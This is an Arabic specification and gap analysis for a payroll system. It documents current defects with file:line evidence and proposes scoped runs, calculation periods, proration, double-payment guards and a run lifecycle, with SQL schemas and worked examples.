# منظومة الرواتب — المواصفة والتحليل الكامل
**صاحب النظام:** كريم · **التاريخ:** 2026-08-16 · **الحالة:** مواصفة معتمدة للتنفيذ

> هذا التقرير يوثّق **كل ما طُلب** في منظومة الرواتب، ويحلّل **الحالة الفعلية للنظام الحالي** (بأدلة ملف:سطر)،
> ويضع **التصميم القابل للتنفيذ** (كيانات وحقول وقواعد) مع **أمثلة رقمية محسوبة** و**حالات حدّية**.
> مكتوب ليخدم هدفين: قرار صاحب النظام، وتنفيذ مبرمج له في **نظام آخر من الصفر**.

---

## ٠) الملخّص التنفيذي — ما يجب أن يُقرأ أولاً

### البنود المطلوبة (13 بندًا) وحالتها

| # | البند المطلوب | الحالة في نظامنا الآن |
|---|---|---|
| ① | مسار رواتب بنطاق (فرع/قسم/مخصّص/بعض موظفي فرع) | الباك جاهز · **الشاشة على المسار القديم** · **استثناء الأفراد غير موجود** |
| ② | فترة الاحتساب (من يوم لـيوم) | يوم البداية إعداد عام · **النهاية مشتقّة حسابيًا** · الفترة المخصّصة **معطّلة في الشاشة** |
| ③ | معادلات لكل مسير (أكثر من طقم) | **غير موجود** — عمود السياسة ميّت · المُقيّم وكتالوج المتغيرات **كود ميت لا يُستورد** |
| ④ | الساعة المرنة بنافذة حضور | **غير موجود** — لا نافذة ولا منطق «حضر بعد النافذة» |
| ⑤ | شرائح خصم التأخير (مضاعف / كسر يوم / نفس السعر) | كسر اليوم والدقيقة موجودان · **المضاعف غير موجود** · الشرائح عامة لا مرتبطة بسياسة |
| ⑥ | البدلات الدائمة + كتالوج | **غير موجود** (الشاشة placeholder) · ⚠️ **خلل قائم: بدلان لا يدخلان المسير** |
| ⑦ | خصومات بأنواع + صلاحية المدير + دورة اعتماد | **غير موجود** — نوع الخصم نص حر بلا تحقق |
| ⑧ | إعفاء موظف من خصم + مكافأة فردية | **غير موجود** كإجراء موثّق ومُدقَّق |
| ⑨ | موظفون مستثنون من الحضور (راتب ثابت) | **غير موجود** — بل يُخصم عليهم غياب اليوم |
| ⑩ | سقوف السلف (نسبة أو مبلغ مقطوع) | **غير موجود** |
| ⑪ | سلفة استثنائية بتقسيط تحدده الموارد البشرية | **غير موجود** |
| ⑫ | الأوفرتايم: نوافذ + اكتشاف بالبصمة + طلب الموظف | النوافذ والاكتشاف ✅ · **طلب الموظف لا يُحتسب فعليًا** |
| ⑬ | تقارير وتحليلات | جزئي |

### 🔴 مخاطر حرجة مكتشفة في النظام الحالي (قبل أي بناء جديد)

هذه ليست متطلبات جديدة — هذه **أخطاء قائمة تمسّ أرقامًا تُصرف فعلًا**:

1. **موظف انتهت خدمته داخل الفترة يأخذ صفرًا.** التصفية تجعله غير نشط، والمسير يفلتر النشطين فقط ⇒ أجر أيام عمله يضيع بالكامل.
2. **موظف انضم داخل الفترة يأخذ الشهر كاملًا.** لا يوجد تناسب (pro-rata) إطلاقًا ⇒ **صرف زائد**.
3. **لا حارس ضد ازدواج الصرف.** لقطة أعضاء المسير تُكتب في قاعدة البيانات ولا تُقرأ في أي سطر ⇒ نفس الموظف قد يُصرف في مسيرين لنفس الفترة.
4. **موظف مستثنى من الحضور يُخصم عليه غياب** — لأن علم الاستثناء غير موجود أصلًا.
5. **بدل الهاتف وبدل طبيعة العمل لا يدخلان المسير** إلا إن جُمعا يدويًا في حقل «بدلات أخرى» ⇒ بدل ساقط أو مزدوج.

> **التوصية:** تُعالَج هذه الخمسة **في الدفعة الأولى قبل أي ميزة جديدة**، لأن كل يوم تشغيل بها يعني أرقامًا خاطئة تُصرف.

### ترتيب التنفيذ المقترح (6 دفعات)

| الدفعة | المحتوى | لماذا هذا الترتيب |
|---|---|---|
| **1** | إصلاح المخاطر الخمسة + الساعة المرنة + فصل «النقص» عن «التأخير» + أوفرتايم بطلب الموظف | الرواتب تقرأ من الحضور — فالحضور أولًا، ومعه تصحيح ما يُصرف خطأً اليوم |
| **2** | محرّك السياسات: كيان السياسة + ربطها بالمسير + نمط المضاعف + تفعيل المُقيّم + بوابة التكافؤ | أساس «كل مسير بمعادلاته» |
| **3** | كتالوج البدلات + كتالوج الخصومات بالأنواع والصلاحيات ودورة الاعتماد + الإعفاءات + المستثنون | تعتمد على السياسة والمحرّك |
| **4** | سقوف السلف + السلفة الاستثنائية بالتقسيط | مستقلة نسبيًا |
| **5** | الشاشات: إنشاء مسير بنطاق وفترة مخصّصة · السياسات · الكتالوجات · السلف | لا قيمة لما لا يُرى (درس مستفاد موثّق) |
| **6** | التقارير والتحليلات | تُبنى فوق بيانات مكتملة |


---

## ١) مسارات الرواتب وفترة الاحتساب

### ١-١ الخلاصة في ٦ أسطر

| السؤال | الجواب المختصر |
|---|---|
| هل نقدر نعمل مسير لكل فرع؟ | **آه** — الكيان والنطاق موجودان (`payroll.entities.ts:15-42`) |
| هل نقدر نعمل مسير لمجموعة موظفين (customized)؟ | **آه في الباك، لأ في الشاشة** — `scopeType='CUSTOM'` مدعوم بالخدمة، والشاشة لسه على `branchId` فقط (`src/app/payroll/page.tsx:142`) |
| هل نقدر نعمل مسير **لبعض موظفي فرع واحد**؟ | **لأ** — مفيش قائمة استثناء (exclude list) في `resolveScope` (`payroll.service.ts:104-136`) |
| هل النظام يمنع صرف نفس الموظف مرتين؟ | **لأ إطلاقاً** — `PayrollRunMember` تُكتب ولا تُقرأ في أي سطر (`payroll.service.ts:217-221`) |
| هل نقدر نحدد «من يوم كام لغاية يوم كام»؟ | **لأ** — البداية مفتاح عام واحد والنهاية مشتقّة حسابياً (`payroll.service.ts:93-96`)، والشاشة بتقول حرفياً «غير متاح حالياً» (`src/app/payroll/page.tsx:400`) |
| أخطر شيء دلوقتي | **الموظف المنتهية خدمته وسط الفترة بياخد صفر** — التصفية بتغيّر `isActive=false` (`offboarding.service.ts:481-482`) والمسير بيفلتر بـ`isActive:true` (`payroll.service.ts:110`) |

---

### ١-٢ المسير بنطاق (Scoped Payroll Run)

#### المطلوب (البند ①)
مسير لكل فرع · مسير لمجموعة موظفين مختارة · **ومسير لبعض موظفي فرع واحد فقط**.

#### الحالة عندنا الآن

| العنصر | الحالة | الدليل |
|---|---|---|
| `scopeType` بستة أنواع (COMPANY/BRANCH/DEPARTMENT/TEAM/COST_CENTER/CUSTOM) | **موجود** | `api/src/payroll/payroll.entities.ts:15-21, 33-34` |
| `scopeIds` + `employeeIds` كـJSON | **موجود** | `payroll.entities.ts:37-42` |
| `name` للمسير | **موجود** | `payroll.entities.ts:30-31` |
| endpoint `POST /payroll/runs/calculate-defined` | **موجود** | `payroll.controller.ts:88-92` |
| **قائمة استثناء أفراد من نطاق واسع** | **غير موجود** | `resolveScope` (`payroll.service.ts:104-136`) مفيهاش أي طرح |
| **قائمة إضافة أفراد فوق النطاق** | **غير موجود** | نفس الدالة |
| الشاشة تستخدم المسار الجديد | **لأ** | `src/app/payroll/page.tsx:142` → `calculatePayroll(branchId, period)` · و`src/lib/api.ts` **مفيهاش دالة `calculateDefined` أصلاً** |
| منع تكرار إنشاء نفس المسير | **جزئي** | dedup لـ`BRANCH` بس (`payroll.service.ts:166-170`) — أي نداء COMPANY/CUSTOM بينشئ **مسير جديد كل مرة** |
| قائمة المسيرات تعرض غير-الفرعية | **معطوبة** | `payroll.service.ts:457-461`: `where: { branchId: scope }` — ومسيرات COMPANY/DEPARTMENT/TEAM/CUSTOM `branchId=null` فمحدش مقيَّد بفرع بيشوفها |

#### التصميم المقترح — كيان `payroll_runs` (الحقول الجديدة بعلامة ★)

| الحقل | النوع | الشرح |
|---|---|---|
| `id` | int PK | — |
| `name` | nvarchar(200) | «مسير فرع الرياض – يوليو 2026» — **إلزامي** لا اختياري |
| `code` ★ | nvarchar(40) UNIQUE | كود مقروء `PR-RYD-2026-07` للتدقيق والمراجع المحاسبية |
| `scopeType` | varchar(20) | COMPANY \| BRANCH \| DEPARTMENT \| TEAM \| COST_CENTER \| CUSTOM |
| `scopeIds` | JSON int[] | معرّفات النطاق (يسمح بنطاق مركّب: فرعين مع بعض) |
| `includeEmployeeIds` ★ | JSON int[] | أفراد يُضافون **فوق** النطاق (موظف معار من فرع تاني) |
| `excludeEmployeeIds` ★ | JSON int[] | **أفراد يُطرَحون من النطاق ← ده الحل للحالة الحاسمة** |
| `policyId` | int FK | طقم المعادلات (البند ③ — قسم منفصل) |
| `periodMode` ★ | varchar(10) | CYCLE \| CUSTOM |
| `period` | char(7) | `2026-07` — مفتاح المطالبة (claim) |
| `startDate` / `endDate` | date | يُخزَّنان دايماً حتى في CYCLE (لقطة) |
| `payableDaysBasis` ★ | varchar(20) | FIXED_30 \| ACTUAL_PERIOD \| SCHEDULED_WORK_DAYS — **لقطة وقت الحساب** |
| `monthlyDaysSnapshot` ★ | int | نسخة من `payroll.monthly_days` وقت الحساب |
| `status` | varchar(20) | DRAFT \| CALCULATED \| IN_REVIEW \| APPROVED \| PAID \| CANCELLED |
| `totalNet` / `totalGross` ★ / `totalDeductions` ★ | decimal(18,2) | — |
| `calculatedBy/At` ★ · `reviewedBy/At` ★ · `approvedBy/At` · `paidBy/At` ★ | int/datetime | أثر كامل |
| `recalcCount` ★ | int | كم مرة اتحسب — مؤشر جودة البيانات |

```sql
-- الفهارس الحاكمة
CREATE UNIQUE INDEX UQ_run_code   ON payroll_runs(code);
CREATE INDEX       IX_run_period  ON payroll_runs(period, status);
CREATE INDEX       IX_run_dates   ON payroll_runs(startDate, endDate);
```

#### الحالة الحاسمة: «مسير لبعض موظفي فرع واحد»

فيه طريقتين، والاتنين مطلوبين لأن الاستخدام مختلف:

| الطريقة | التعريف | امتى تستخدمها | مثال |
|---|---|---|---|
| **(أ) نطاق ناقص استثناء** | `scopeType=BRANCH, scopeIds=[الرياض], excludeEmployeeIds=[نورة, عمر]` | الاستثناءات **قليلة** والباقي كله داخل | «مسير الرياض ما عدا الإدارة العليا» — لو دخل موظف جديد الفرع يدخل المسير **تلقائياً** |
| **(ب) قائمة صريحة** | `scopeType=CUSTOM, employeeIds=[12, 45, 78]` | المختارين **قليلين** | «مسير مندوبي المبيعات بعمولة يوليو» — الموظف الجديد **مش** بيدخل تلقائياً (وده مقصود) |

> **القاعدة العملية للمبرمج:** الاتنين بيعدّوا على نفس دالة `resolveScope` — الفرق في الإدخال بس. ومهم جداً تعرض للمستخدم **قبل الحفظ** معاينة الأعضاء المحلولين (`POST /payroll/runs/preview-scope`) عشان يشوف بعينه مين هيدخل قبل ما يضغط «احسب».

> **الملحق الإلزامي:** لما تسمح بمسيرات جزئية لازم تحمي نفسك من النسيان. اعمل تقرير **«موظفون بلا مسير في الفترة»** — كل موظف كان على رأس العمل خلال `[startDate, endDate]` وملوش صف INCLUDED في أي مسير غير ملغي. ده التوأم الضروري للحارس ضد الازدواج: الحارس يمنع المرتين، والتقرير ده يمنع الصفر.

---

### ١-٣ حلّ النطاق (resolveScope) — مين يدخل ومين يُستبعد

#### الحالة عندنا الآن
```ts
// payroll.service.ts:110
const where: Record<string, unknown> = { isActive: true }
```
ده **كل** الفلترة. النتيجة بالضبط:

| الحالة | ماذا يحدث اليوم | الخطورة |
|---|---|---|
| موظف انتهت خدمته يوم 10 من الفترة | `finalize()` بتحطّ `isActive=false` (`offboarding.service.ts:481-482`) → **يختفي من المسير كأنه مش موجود** → مرتب 18 يوم شغل ضايع | **CRITICAL** |
| موظف انضم يوم 15 من الفترة | يدخل ويأخذ **الشهر كامل** — مفيش أي تناسب (`payroll.service.ts:231` بيجمع الإجمالي كامل) | **CRITICAL — صرف زائد** |
| موظف موقوف `suspended` | يدخل عادي طالما `isActive=true` | HIGH |
| موظف اتنقل لفرع تاني وسط الفترة | `branchId` بيتكتب فوق القديم بلا تاريخ (مفيش جدول `employee_assignments` — تأكدت بالبحث) → **يختفي من مسير الفرع القديم بصمت** | HIGH |
| موظف مستثنى من الحضور (مدير/ميداني) | يدخل ويتجسّدله غياب ويتخصم (`payroll.service.ts:259, 284-286`) | **CRITICAL** |

#### التصميم المقترح

```
resolveScope(run) :
  ── (1) المرشحون الخام من النطاق ────────────────────────────
  base =
    COMPANY      → كل الموظفين
    BRANCH       → employees WHERE assignmentAt(run.endDate).branchId     IN run.scopeIds
    DEPARTMENT   → employees WHERE assignmentAt(run.endDate).departmentId IN run.scopeIds
    TEAM         → employees WHERE assignmentAt(run.endDate).teamId       IN run.scopeIds
    COST_CENTER  → employees WHERE assignmentAt(run.endDate).costCenterId IN run.scopeIds
    CUSTOM       → employees WHERE id IN run.employeeIds

  ── (2) الإضافة والطرح اليدوي ───────────────────────────────
  candidates = (base ∪ run.includeEmployeeIds) − run.excludeEmployeeIds

  ── (3) فلتر التوظيف الفعلي (بديل isActive) ─────────────────
  hireDate  = COALESCE(emp.actualStartDate, emp.joinDate, '1900-01-01')
  leaveDate = COALESCE(offboardingCase.lastWorkingDay,
                       CAST(emp.archivedAt AS date),
                       '9999-12-31')

  employedInPeriod(e) =  hireDate <= run.endDate
                     AND leaveDate >= run.startDate

  ── (4) نافذة التغطية داخل الفترة (أساس التناسب) ────────────
  coverFrom = MAX(run.startDate, hireDate)
  coverTo   = MIN(run.endDate,   leaveDate)
  coverDays = DATEDIFF(day, coverFrom, coverTo) + 1

  ── (5) الحالات الموقوفة عن الصرف ───────────────────────────
  payable(e) = e.status NOT IN ('archived')
             AND NOT (e.status = 'suspended' AND policy.suspendedUnpaid = true)

  return candidates.filter(employedInPeriod).filter(payable) with {coverFrom, coverTo, coverDays}
```

#### جدول أسباب الاستبعاد (يُخزَّن، مش يُرمى)

| `exclusionReason` | المعنى | يظهر في تقرير المسير؟ |
|---|---|---|
| `MANUAL_EXCLUDE` | المستخدم شاله من القائمة | نعم — مع اسم من شاله |
| `NOT_EMPLOYED` | التوظيف مش متقاطع مع الفترة | نعم |
| `ARCHIVED` | مؤرشف | نعم |
| `SUSPENDED_UNPAID` | موقوف بلا أجر بقرار السياسة | نعم |
| `DUPLICATE_IN_RUN` | مصروف في مسير تاني لنفس الفترة | **نعم — مع رقم المسير الآخر** |
| `NO_SALARY_DEFINED` | `basicSalary` فاضي | نعم — **تحذير أحمر** |

> **قاعدة ذهبية:** الموظف اللي اتستبعد **بيتخزن صف** في `payroll_run_members` بحالة `EXCLUDED` وسبب. الاستبعاد الصامت (اللي بيحصل النهاردة) هو أخطر شيء في أي نظام رواتب — لأن الغلط بيظهر بعد ما الموظف يشتكي، مش قبلها.

---

### ١-٤ لقطة الأعضاء (Snapshot) والحارس ضد ازدواج الصرف

#### ليه اللقطة ضرورية؟
1. **منع الازدواج** — نفس الموظف في مسيرين لنفس الفترة (مسير الفرع + مسير مخصّص) = صرف مرتين، ومفيش حاجة في النظام دلوقتي بتمنعها.
2. **التدقيق** — بعد 6 شهور تسأل «ليه فلان مكانش في مسير مارس؟» لازم يكون فيه صف بيقول السبب.
3. **الثبات** — الموظف اتنقل لفرع تاني بعد الاعتماد؟ اللقطة بتحفظ إنه كان تابع للرياض وقت الحساب، فالتقرير المحاسبي (مركز التكلفة) يفضل صح.

#### الحالة عندنا الآن
الكيان موجود (`payroll.entities.ts:82-95`) بحقلين بس: `runId`, `employeeId`. بيتكتب في `payroll.service.ts:217-221` وبيتمسح في `:194`، و**مفيش سطر واحد في المشروع بيقراه**. يعني كيان ميّت وظيفياً، والحماية من الازدواج = **صفر**.

#### التصميم المقترح — `payroll_run_members`

| الحقل | النوع | الشرح |
|---|---|---|
| `runId` / `employeeId` | int | UNIQUE(runId, employeeId) — موجود فعلاً |
| `membershipStatus` ★ | varchar(20) | `INCLUDED` \| `EXCLUDED` |
| `inclusionSource` ★ | varchar(20) | `SCOPE` \| `MANUAL_INCLUDE` |
| `exclusionReason` ★ | varchar(30) | الجدول اللي فوق |
| `coverFrom` / `coverTo` ★ | date | نافذة التغطية الفعلية |
| `coverDays` ★ | decimal(6,2) | أيام التغطية |
| `prorationFactor` ★ | decimal(9,6) | `coverDays / periodDays` |
| `branchIdSnap` / `departmentIdSnap` / `teamIdSnap` / `costCenterIdSnap` ★ | int | التنظيم وقت الحساب |
| `basicSalarySnap` / `allowancesSnap` ★ | decimal(18,2) | الراتب وقت الحساب |
| `salaryModeSnap` ★ | varchar(20) | `ATTENDANCE_BASED` \| `FIXED` (البند ⑨) |

#### الحارس — طبقتين (لازم الاتنين)

**الطبقة الأولى — فحص منطقي قبل الحساب (soft، بيدي رسالة مفهومة):**
```sql
-- أي موظف من المرشحين له عضوية INCLUDED في مسير تاني بفترة متقاطعة؟
SELECT m.employeeId, r.id AS otherRunId, r.name, r.status, r.startDate, r.endDate
FROM   payroll_run_members m
JOIN   payroll_runs        r ON r.id = m.runId
WHERE  m.employeeId IN (:candidateIds)
  AND  m.membershipStatus = 'INCLUDED'
  AND  r.id     <> :thisRunId
  AND  r.status IN ('CALCULATED','IN_REVIEW','APPROVED','PAID')
  AND  r.startDate <= :thisEndDate      -- تقاطع فترات
  AND  r.endDate   >= :thisStartDate;
```

| حالة المسير الآخر | القرار |
|---|---|
| `PAID` أو `APPROVED` | **رفض قاطع** — `409 Conflict` مع كشف بالأسماء وأرقام المسيرات |
| `CALCULATED` / `IN_REVIEW` (مسودة) | **تحذير + اختيار صريح**: «استبعدهم من هنا» أو «استبعدهم من المسير الآخر». ممنوع المرور بلا اختيار |

**الطبقة الثانية — قفل على مستوى قاعدة البيانات (hard، ضد التزامن):**
```sql
CREATE TABLE payroll_period_claims (
  employeeId INT       NOT NULL,
  periodKey  CHAR(7)   NOT NULL,   -- '2026-07'
  runId      INT       NOT NULL,
  claimedAt  DATETIME  NOT NULL DEFAULT SYSUTCDATETIME(),
  CONSTRAINT UQ_period_claim UNIQUE (employeeId, periodKey)
);
```
- **يُكتب عند الانتقال إلى `APPROVED`** (مش عند الحساب — المسودات بتتعاد كتير).
- الاعتماد التاني لنفس الموظف بيفشل على القيد نفسه → رسالة: «الموظف #103 مصروف في المسير PR-RYD-2026-07».
- **يُمسح** عند `CANCELLED` أو عند فتح المسير (reopen) — مش عند الحذف العادي.
- ده بيحمي من الحالة النادرة والخطيرة: اتنين مستخدمين بيعتمدوا مسيرين في نفس اللحظة، والفحص المنطقي عدّى على الاتنين قبل ما أي واحد يكتب.

> **ملاحظة للمبرمج:** القيد الفريد ده بيغطي `periodKey` المتطابق. الفترات المخصّصة المتقاطعة (مثلاً `06-23→07-22` و`07-01→07-31`) مبتتغطّاش بالقيد — فالاستعلام في الطبقة الأولى **مش رفاهية**، هو الحماية الوحيدة في الحالة دي.

---

### ١-٥ فترة الاحتساب

#### المطلوب (البند ②)
«إحنا اللي نحدد الفترة: من يوم كام لغاية يوم كام».

#### الحالة عندنا الآن

| العنصر | الحالة | الدليل |
|---|---|---|
| يوم البداية | مفتاح إعداد **عام واحد للشركة** | `payroll.service.ts:93` ← `payroll.cycle_start_day` · البذرة `requests-seed.data.ts:263` = `'23'` |
| يوم النهاية | **مشتقّ حسابياً**، مش قابل للتعريف | `payroll.service.ts:95-96` → `startDay - 1` من الشهر التالي |
| فترة مخصّصة بتاريخين | **غير موجودة** — `startDate/endDate` بيتملوا من `periodRange()` بس | `payroll.service.ts:159` · الـDTO مفيهاش تواريخ (`payroll.controller.ts:34-60`) |
| فترة لكل فرع/سياسة | **غير موجودة** | مفتاح واحد عام |
| الشاشة | فيها الحقول ومعطّلة بنص صريح | `src/app/payroll/page.tsx:400`: «الاحتساب بفترة مخصصة غير متاح حالياً» |

> **باگ مؤكَّد في اشتقاق الدورة:** `new Date(y, m-2, startDay)` (`payroll.service.ts:95`) بيتعامل مع الأيام اللي مش موجودة في الشهر بالـrollover. لو `cycle_start_day = 30` وفترة `2026-03` → `new Date(2026, 1, 30)` = **2026-03-02** (فبراير 28 يوم فبيلفّ)، والنهاية `new Date(2026, 2, 29)` = 2026-03-29. الفترة بتطلع `03-02 → 03-29` بدل `02-28 → 03-29`. مع القيمة الافتراضية 23 المشكلة مش بتظهر، لكن المتطلب صريح إن المستخدم هو اللي يحدد اليوم.

#### التصميم المقترح — ثلاث أنماط + ترتيب أولوية

**النمط الأول — دورة (CYCLE):** يوم بداية → يوم نهاية
```
cycleStartDay = 23,  cycleEndDay = 22,  period = '2026-07'
startDate = clampToMonth(الشهر السابق, 23)   → 2026-06-23
endDate   = clampToMonth(شهر الفترة,   22)   → 2026-07-22

clampToMonth(month, day) = DATE(year, month, MIN(day, lastDayOfMonth(month)))
       ← يعالج فبراير و30/31 بلا rollover
```
لو `cycleEndDay >= cycleStartDay` (مثلاً 1 → 25) فالفترة **جوّه نفس الشهر** ولا ترجع للشهر السابق.

**النمط الثاني — مخصّص (CUSTOM):** `startDate` و`endDate` صريحين من المستخدم. تحقق إلزامي: `endDate >= startDate` وأن المدى ≤ 62 يوم (حاجز أمان ضد الغلطة الكارثية).

**النمط الثالث — موروث:** المسير مبيحددش، بيرث من السياسة أو الفرع.

**ترتيب الأولوية (الأعلى يكسب):**
```
1. run.startDate / run.endDate      (periodMode = CUSTOM)
2. policy.cycleStartDay / cycleEndDay   (السياسة المربوطة بالمسير)
3. branch.cycleStartDay / cycleEndDay   (عمود جديد على الفرع)
4. config 'payroll.cycle_start_day' = 23  (العام)
```
**وفي كل الحالات: `startDate`/`endDate` المحلولين بيتخزنوا على المسير** — فأي تغيير في الإعداد بعدين **ميغيّرش** مسير محسوب أو معتمد.

#### اشتقاق الأيام وأثره على القسمة

```
periodDays   = DATEDIFF(day, startDate, endDate) + 1        -- 28 .. 31
workingDays  = periodDays − (ويك إند الموظف + العطلات الرسمية داخل الفترة)
coverDays    = DATEDIFF(day, coverFrom, coverTo) + 1        -- من ١-٣

divisorDays  = حسب payableDaysBasis :
                 FIXED_30            → monthlyDays (30)      ← السلوك الحالي
                 ACTUAL_PERIOD       → periodDays
                 SCHEDULED_WORK_DAYS → workingDays

dayRate      = gross / divisorDays
hourRate     = dayRate / dailyHours (8)
minuteRate   = hourRate / 60

prorationFactor = MIN(1, coverDays / periodDays)
grossEarned     = gross × prorationFactor
```

> **القاعدة المعمارية الأهم في القسم ده:** **افصل «معامل التناسب» عن «قيمة اليوم».**
> - التناسب دايماً بـ`periodDays` **الفعلية** (لأنه نسبة من الفترة).
> - قيمة اليوم للخصم بـ`divisorDays` حسب الأساس المختار.
>
> لو خلطتهم (زي ما كتير من الأنظمة بتعمل) هتلاقي موظف كامل الفترة في شهر 31 يوم بيطلع معامله `31/30 = 1.033` فيتصرفله 103% من راتبه. الفصل ده بيمنع التسريب ده تماماً.

#### أثر الأساس بالأرقام — إجمالي 9,000 ريال، فترة `2026-06-23 → 2026-07-22`

| الأساس | المقسوم عليه | قيمة اليوم | خصم يوم غياب | خصم 75 دقيقة تأخير (بالدقيقة) |
|---|---|---|---|---|
| `FIXED_30` (الحالي) | 30 | **300.00** | 300.00 | 46.88 |
| `ACTUAL_PERIOD` | 30 (الفترة دي 30 يوم) | 300.00 | 300.00 | 46.88 |
| `ACTUAL_PERIOD` في فترة 31 يوم | 31 | 290.32 | 290.32 | 45.36 |
| `SCHEDULED_WORK_DAYS` | 22 يوم عمل | **409.09** | 409.09 | 63.92 |

**الفرق بين أول وآخر صف = 36%** على نفس الغياب. عشان كده الأساس لازم يكون **قرار معلن ومخزَّن على المسير**، مش مفتاح عام يقدر أي حد يغيّره بعد الحساب.

| الأساس | متى تختاره | التحذير |
|---|---|---|
| `FIXED_30` | الأشيع في الخليج — عادل وبسيط وثابت بين الشهور | يوم الخصم أرخص من يوم العمل الحقيقي |
| `ACTUAL_PERIOD` | لو عايز دقة تقويمية | الخصم بيختلف بين يناير وفبراير على نفس الغلطة → شكاوى |
| `SCHEDULED_WORK_DAYS` | العمالة اليومية/بالساعة | أغلى خصم — راجعه قانونياً |

---

### ١-٦ دورة حياة المسير

#### الحالة عندنا الآن
ثلاث حالات: `CALCULATED → APPROVED → PAID` (`payroll.entities.ts:12`). مفيش مرحلة مراجعة، **ومفيش فتح/إلغاء إطلاقاً** — يعني مسير اتصرف بالغلط **مالوش أي مخرج في الكود**.

#### الحالات المقترحة
```
DRAFT ──احسب──▶ CALCULATED ──أرسل للمراجعة──▶ IN_REVIEW ──اعتمد──▶ APPROVED ──اصرف──▶ PAID
                    ▲   │                          │  │                  │
                    └───┘ إعادة حساب حرة           │  └──ارجع للتعديل────┘  (بصلاحية reopen + سبب)
                                                   └──▶ CANCELLED (قبل الاعتماد فقط)
```

#### ماذا يُقفل في كل حالة

| الحالة | إعادة الحساب | تعديل النطاق/الأعضاء | تغيير راتب الموظف ينعكس؟ | الإعفاءات والبونص | تظهر القسيمة للموظف؟ | مطالبة الفترة (claim) | الآثار الجانبية |
|---|---|---|---|---|---|---|---|
| `DRAFT` | — | ✅ | — | ✅ | ❌ | ❌ | لا شيء |
| `CALCULATED` | ✅ **حرّة** | ✅ | ✅ عند إعادة الحساب | ✅ | ❌ (`payroll.service.ts:482`) | ❌ | لا شيء |
| `IN_REVIEW` | ✅ لكن **بترجّع الحالة لـCALCULATED** ويُسجَّل الحدث | ✅ مع تسجيل | ✅ عند إعادة الحساب | ✅ | ❌ | ❌ | لا شيء |
| `APPROVED` | ❌ **مرفوض** — لازم reopen | ❌ | ❌ (البنود لقطة) | ❌ | ✅ | ✅ **تُكتب** | لا شيء |
| `PAID` | ❌ **مرفوض قطعياً** | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ أوفرتايم→PAID · أقساط→paid · مديونيات→APPLIED (`payroll.service.ts:429-448`) |
| `CANCELLED` | ❌ | ❌ | — | — | ❌ | ❌ (تُمسح) | تُعكَس لو كانت اتنفّذت |

#### إعادة الحساب — القواعد
1. **في `CALCULATED`:** مسموح بلا قيود. الكود الحالي بيمسح البنود والأعضاء ويعيد (`payroll.service.ts:193-194`) — ده صحيح، بس **زوّد `recalcCount++`** وسجّل حدث `PayrollRunEvent`.
2. **في `IN_REVIEW`:** مسموح، لكن بيلغي المراجعة ويرجّع `CALCULATED` — عشان محدش يراجع نسخة ويعتمد نسخة تانية.
3. **في `APPROVED`:** مرفوض (الكود الحالي بيرفض صح — `payroll.service.ts:171-175`). المخرج الوحيد `POST /payroll/runs/:id/reopen` بصلاحية `payroll.reopen` **+ سبب نصّي إلزامي**، وبتعمل: مسح المطالبة · تصفير `approvedBy/At` · رجوع لـ`CALCULATED` · تسجيل الحدث.
4. **في `PAID`:** **مرفوض نهائياً — ومفيش reopen.** الفرق يتعالج بـ**تسوية في المسير التالي**: قيد في دفتر المديونيات (`EmployeeObligation` — `financial.entities.ts:59-109`) نوع `DEBIT` أو `CREDIT` بفئة `payroll_retro` ومرجع رقم المسير القديم. ده مبدأ محاسبي: **المصروف لا يُعدَّل، يُصحَّح بقيد مقابل.**

> **فجوة لازم تتسدّ:** دالة `pay()` (`payroll.service.ts:419-454`) بتنفّذ 3 آثار جانبية غير قابلة للعكس، **ومفيش دالة `unpay`**. لو اتصرف مسير بالغلط، الأوفرتايم بقى `PAID` والأقساط `paid` والمديونيات `APPLIED` — والاسترجاع يدوي على قاعدة البيانات. **صمّم `reversePay()`** من البداية: بتقرا نفس `breakdown` وترجّع الحالات الثلاثة، وتُحمى بصلاحية منفصلة `payroll.reverse` وسبب إلزامي، وتحطّ المسير في `APPROVED` (مش `CALCULATED`).

#### كيان الأحداث (مطلوب — مش موجود)
```sql
CREATE TABLE payroll_run_events (
  id         INT IDENTITY PRIMARY KEY,
  runId      INT NOT NULL,
  eventType  VARCHAR(30) NOT NULL,  -- CREATED|RECALCULATED|SENT_TO_REVIEW|APPROVED
                                    -- |REOPENED|PAID|REVERSED|CANCELLED|MEMBER_EXCLUDED
  actorUserId INT NOT NULL,
  reason     NVARCHAR(500) NULL,    -- إلزامي في REOPENED/REVERSED/MEMBER_EXCLUDED
  payload    NVARCHAR(MAX) NULL,    -- JSON: totalNet قبل/بعد، عدد الأعضاء...
  createdAt  DATETIME NOT NULL DEFAULT SYSUTCDATETIME()
);
```

---

### ١-٧ الحالات الحدّية

| # | الحالة | ما يحدث اليوم (بالدليل) | القاعدة المقترحة |
|---|---|---|---|
| **ح١** | **موظف انضم داخل الفترة** (joinDate = 2026-07-01) | يدخل ويأخذ **الإجمالي كامل** — `gross = basic + allowances` بلا تناسب (`payroll.service.ts:231`) | `coverFrom = MAX(startDate, hireDate)` → `grossEarned = gross × coverDays/periodDays`. الغياب لأيام قبل الانضمام **مش** بيتجسّد (`materializeAbsences` بتحترم `joinDate` — `attendance.service.ts:552-575`) ✅ |
| **ح٢** | **انتهت خدمته داخل الفترة** (LWD = 2026-07-10) | **يُسقَط من المسير كلياً** — `finalize()` بتحطّ `isActive=false` (`offboarding.service.ts:481-482`) و`resolveScope` بتفلتر `isActive:true` (`payroll.service.ts:110`). ومستحقات التصفية **مبتشملش مرتب الفترة** (`offboarding.service.ts:226-343` = مكافأة نهاية خدمة + بدل إجازات + أوفرتايم − سلف − عهدة) → **مرتب 18 يوم شغل بيضيع** | `employedInPeriod` بدل `isActive` · `coverTo = lastWorkingDay` · تناسب |
